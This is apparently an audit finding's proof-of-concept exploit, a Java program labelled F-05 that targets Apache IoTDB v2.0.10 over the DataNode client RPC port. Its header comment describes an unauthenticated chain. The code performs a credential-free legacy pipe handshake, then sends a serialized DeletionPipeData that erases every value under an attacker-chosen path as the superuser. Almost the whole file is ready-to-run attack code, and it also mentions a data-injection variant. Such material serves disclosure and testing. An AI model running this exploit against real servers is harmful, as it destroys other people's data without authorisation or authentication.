import org.apache.iotdb.service.rpc.thrift.*;
import org.apache.iotdb.common.rpc.thrift.TSStatus;
import org.apache.iotdb.db.pipe.sink.payload.legacy.DeletionPipeData;
import org.apache.iotdb.db.storageengine.dataregion.modification.v1.Deletion;
import org.apache.iotdb.commons.path.MeasurementPath;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;

/**
 * F-05 — Unauthenticated data destruction as root via the legacy pipe sendPipeData path
 *        (DataNode client RPC, port 6667).
 *
 * Chain (Apache IoTDB v2.0.10, commit 3c26382b):
 *   - Legacy handshake authenticates no credential (see F-02).
 *   - IoTDBLegacyPipeReceiverAgent.transportPipeData (:199) -> PipeData.createPipeData decodes an
 *     attacker DeletionPipeData (PipeData.java:81) -> createLoader().load() runs a DeletionLoader
 *     as AuthorityChecker.SUPER_USER. Attacker-chosen path + time range are deleted.
 *
 * In scope: full data compromise (destruction) as root, unauthenticated. Password-independent.
 * The TSFILE arm (arbitrary data INJECTION via TsFileLoader) is the same path, not shown here.
 *
 * Usage: java F05_LegacyDataDeletion <host> <6667> <targetPath e.g. root.demo.d.s>
 */
public class F05_LegacyDataDeletion {
  static void setField(Object o, String name, Object v) throws Exception {
    Class<?> k = o.getClass();
    while (k != null) {
      try { Field f = k.getDeclaredField(name); f.setAccessible(true); f.set(o, v); return; }
      catch (NoSuchFieldException e) { k = k.getSuperclass(); }
    }
    throw new NoSuchFieldException(name);
  }

  public static void main(String[] a) throws Exception {
    String host = a.length > 0 ? a[0] : "127.0.0.1";
    int port    = a.length > 1 ? Integer.parseInt(a[1]) : 6667;
    String target = a.length > 2 ? a[2] : "root.demo.d.s";

    System.out.println("[F-05] " + Common.ts() + "  target=" + host + ":" + port
        + " path=" + target + "  (no openSession, no credentials)");
    IClientRPCService.Client c = Common.clientRpc(host, port);

    TSyncIdentityInfo id = new TSyncIdentityInfo();
    id.setPipeName("validationdel");
    id.setCreateTime(1L);
    id.setVersion("UNKNOWN");
    id.setDatabase("");
    TSStatus hs = c.handshake(id);
    System.out.println("[F-05] legacy handshake (no creds)    -> " + Common.code(hs));

    MeasurementPath mp = new MeasurementPath(target);
    Deletion del = new Deletion(mp, 0L, Long.MIN_VALUE, Long.MAX_VALUE);
    DeletionPipeData dpd = new DeletionPipeData();
    setField(dpd, "serialNumber", 1L);
    setField(dpd, "database", target.substring(0, target.indexOf('.', 5) > 0 ? target.indexOf('.', 5) : target.length()));
    setField(dpd, "deletion", del);

    ByteArrayOutputStream bo = new ByteArrayOutputStream();
    DataOutputStream dos = new DataOutputStream(bo);
    dpd.serialize(dos);
    dos.flush();
    TSStatus st = c.sendPipeData(ByteBuffer.wrap(bo.toByteArray()));
    System.out.println("[F-05] sendPipeData (DeletionPipeData) -> " + Common.code(st));
    System.out.println("[F-05] " + Common.ts()
        + "  If code=200, all data under " + target + " was deleted as SUPER_USER (verify count before/after).");
  }
}
